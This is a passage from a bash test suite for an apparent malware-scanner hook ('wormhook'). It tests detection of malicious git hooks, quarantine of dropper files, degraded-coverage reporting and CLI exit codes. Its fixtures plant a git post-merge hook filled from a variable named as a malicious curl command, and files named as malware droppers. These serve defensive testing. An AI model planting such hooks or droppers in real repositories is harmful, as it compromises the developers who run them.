HOME="$CASE_HOME" git -C "$CASE_DIR/other" init -q
HOME="$CASE_HOME" git -C "$CASE_DIR/other" config core.hooksPath relative-hooks
mkdir -p "$CASE_DIR/other/relative-hooks"
printf '#!/bin/sh\n%s\n' "$MAL_CURL_SH" > "$CASE_DIR/other/relative-hooks/post-merge"
OUT="$(_run_engine "$(_payload PreToolUse "npm --prefix $CASE_DIR/other install")")"
assert_jq "T0 git: relative hooks in command target block" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.systemMessage|contains("MALICIOUS GIT HOOK"))'

for setting in 0 false; do
  _mktemp_case
  mkdir -p "$CASE_HOME/.claude"
  printf '// fixture\n' > "$CASE_HOME/.claude/$MAL_DROPPER"
  OUT="$(printf '%s' "$(_payload UserPromptSubmit)" | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" \
    WORMHOOK_QUARANTINE="$setting" bash "$ENGINE" 2>/dev/null)"
  assert_jq "quarantine=$setting: finding still blocks" "$OUT" '.decision=="block"'
  if [[ -f "$CASE_HOME/.claude/$MAL_DROPPER" ]]; then _ok "quarantine=$setting: artifact unchanged"
  else _bad "quarantine=$setting: artifact unchanged"; fi
done

_mktemp_case
mkdir -p "$CASE_HOME/.claude"
printf '// unrelated file\n' > "$CASE_DIR/target"
chmod 600 "$CASE_DIR/target"
ln -s "$CASE_DIR/target" "$CASE_HOME/.claude/$MAL_DROPPER"
OUT="$(printf '%s' "$(_payload UserPromptSubmit)" | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" \
  WORMHOOK_QUARANTINE=1 bash "$ENGINE" 2>/dev/null)"
assert_jq "quarantine: symlink is advisory" "$OUT" '.systemMessage|contains("QUARANTINE SKIPPED")'
if [[ -L "$CASE_HOME/.claude/$MAL_DROPPER" && -r "$CASE_DIR/target" ]]; then _ok "quarantine: symlink target untouched"
else _bad "quarantine: symlink target untouched"; fi

_mktemp_case
mkdir -p "$CASE_HOME/.claude" "$CASE_DIR/bin"
printf '// fixture\n' > "$CASE_HOME/.claude/$MAL_DROPPER"
printf '#!/bin/sh\nexit 1\n' > "$CASE_DIR/bin/chmod"
chmod +x "$CASE_DIR/bin/chmod"
OUT="$(printf '%s' "$(_payload UserPromptSubmit)" | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" \
  PATH="$CASE_DIR/bin:$PATH" WORMHOOK_QUARANTINE=1 bash "$ENGINE" 2>/dev/null)"
assert_jq "quarantine: chmod failure is reported" "$OUT" \
  '.systemMessage|contains("QUARANTINE INCOMPLETE") and (contains("It can no longer fire")|not)'

_mktemp_case
mkdir -p "$CASE_CWD/.venv" "$CASE_CWD/node_modules/lib" "$CASE_DIR/bin"
printf 'module.exports=1;\n' > "$CASE_CWD/node_modules/lib/index.js"
cat > "$CASE_DIR/bin/timeout" <<'SH'
#!/bin/sh
case "$*" in *'*.pth'*|*'*.abi3.so'*) exit 124 ;; esac
shift
exec "$@"
SH
chmod +x "$CASE_DIR/bin/timeout"
OUT="$(printf '%s' "$(_payload PostToolUse 'npm install')" | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" \
  PATH="$CASE_DIR/bin:$PATH" bash "$ENGINE" 2>/dev/null)"
assert_jq "T0 Python: timed-out walks report degraded coverage" "$OUT" \
  '.verdict=="yellow" and (.systemMessage|contains(".pth scan") and contains("native-module scan"))'
if [[ ! -d "$CASE_CACHE/notambourine/malware-scan" ]]; then _ok "T0 timeout: clean cache not written"
else _bad "T0 timeout: clean cache not written"; fi

_mktemp_case
mkdir -p "$CASE_DIR/bin" "$CASE_CWD/node_modules/lib"
printf 'module.exports=1;\n' > "$CASE_CWD/node_modules/lib/index.js"
printf '#!/bin/sh\nexit 127\n' > "$CASE_DIR/bin/timeout"
chmod +x "$CASE_DIR/bin/timeout"
OUT="$(printf '%s' "$(_payload PostToolUse 'npm install')" | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" \
  PATH="$CASE_DIR/bin:$PATH" bash "$ENGINE" 2>/dev/null)"
assert_jq "T2: unavailable timeout reports degraded coverage" "$OUT" \
  '.verdict=="yellow" and (.systemMessage|contains("IOC-filename walk") and contains("content scan"))'

cat > "$CASE_DIR/bin/timeout" <<'SH'
#!/bin/sh
case "$*" in *'-maxdepth 2'*) exit 124 ;; esac
shift
exec "$@"
SH
OUT="$(printf '%s' "$(_payload PostToolUse 'npm install')" | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" \
  PATH="$CASE_DIR/bin:$PATH" bash "$ENGINE" 2>/dev/null)"
assert_jq "T2: fingerprint timeout reports degraded coverage" "$OUT" \
  '.verdict=="yellow" and (.systemMessage|contains("cache not refreshed"))'
if [[ ! -d "$CASE_CACHE/notambourine/malware-scan" ]]; then _ok "T2 fingerprint failure: no cache written"
else _bad "T2 fingerprint failure: no cache written"; fi

_mktemp_case
mkdir -p "$CASE_DIR/bin"
cat > "$CASE_DIR/bin/rg" <<'SH'
#!/bin/sh
[ "$1" = -q ] && exit 1
exit 2
SH
chmod +x "$CASE_DIR/bin/rg"
OUT="$(printf '%s' "$(_payload UserPromptSubmit)" | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" \
  PATH="$CASE_DIR/bin:$PATH" bash "$ENGINE" 2>/dev/null)"
assert_jq "T1: source scan error stays visible on a human prompt" "$OUT" \
  '.verdict=="yellow" and (.systemMessage|contains("source content scan failed")) and (has("decision")|not)'

_mktemp_case
mkdir -p "$CASE_DIR/broken"
cp "$SCAN_CLI" "$ENGINE" "$REPO_ROOT/scripts/wormhook-const.sh" "$CASE_DIR/broken/"
OUT="$(HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" bash "$CASE_DIR/broken/wormhook-scan.sh" --persistence 2>/dev/null)"; RC=$?
if [[ "$RC" == 2 && "$OUT" == *'🟡'* && "$OUT" != *'🟢'* ]]; then _ok "CLI persistence: missing signatures degrade"
else _bad "CLI persistence: missing signatures degrade" "rc=$RC output=$OUT"; fi

CASE_CWD="$(cd -P "$CASE_CWD" && pwd)"
cat > "$CASE_DIR/broken/wormhook.sh" <<'SH'
#!/bin/bash
cwd=$(jq -r .cwd)
if [[ "$cwd" == "$WH_TEST_REPO" ]]; then
  printf '%s\n' '{"verdict":"green"}'
else
  printf '%s\n' '{"verdict":"yellow","systemMessage":"global scan incomplete"}'
fi
SH
OUT="$(HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" WH_TEST_REPO="$CASE_CWD" \
  bash "$CASE_DIR/broken/wormhook-scan.sh" --literal --json "$CASE_CWD" 2>/dev/null)"; RC=$?
assert_jq "CLI fleet: global degradation survives clean repo scan" "$OUT" \
  '.global_status=="🟡" and .repos[0].status=="🟢"'
if [[ "$RC" == 2 ]]; then _ok "CLI fleet: global degradation returns 2"
else _bad "CLI fleet: global degradation returns 2" "rc=$RC"; fi

_mktemp_case
mkdir -p "$CASE_DIR/empty" "$CASE_DIR/broken"
PATH="$CASE_DIR/empty" /bin/bash "$SCAN_CLI" check >/dev/null 2>&1; RC=$?
if [[ "$RC" == 2 ]]; then _ok "CLI check: missing jq returns degraded"
else _bad "CLI check: missing jq returns degraded" "rc=$RC"; fi
cp "$SCAN_CLI" "$CASE_DIR/broken/"
bash "$CASE_DIR/broken/wormhook-scan.sh" check >/dev/null 2>&1; RC=$?
if [[ "$RC" == 2 ]]; then _ok "CLI check: missing engine returns degraded"
else _bad "CLI check: missing engine returns degraded" "rc=$RC"; fi
cp "$ENGINE" "$CASE_DIR/broken/"
bash "$CASE_DIR/broken/wormhook-scan.sh" check >/dev/null 2>&1; RC=$?
if [[ "$RC" == 2 ]]; then _ok "CLI check: missing constants return degraded"
else _bad "CLI check: missing constants return degraded" "rc=$RC"; fi

for arg in "$CASE_DIR/missing" --unsupported; do
  HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" bash "$SCAN_CLI" check "$arg" >/dev/null 2>&1; RC=$?
  if [[ "$RC" == 2 ]]; then _ok "CLI check: rejects $arg"
  else _bad "CLI check: rejects $arg" "rc=$RC"; fi
done
OUT="$(HOME="$CASE_HOME" bash "$SCAN_CLI" --help 2>/dev/null)"
if [[ "$OUT" == *'eval "$(wormhook-scan shell-init)"'* ]]; then _ok "CLI help: prints shell-init command literally"
else _bad "CLI help: prints shell-init command literally"; fi

echo
printf 'tests: %d passed, %d failed\n' "$PASS" "$FAIL"
[[ "$FAIL" -eq 0 ]]
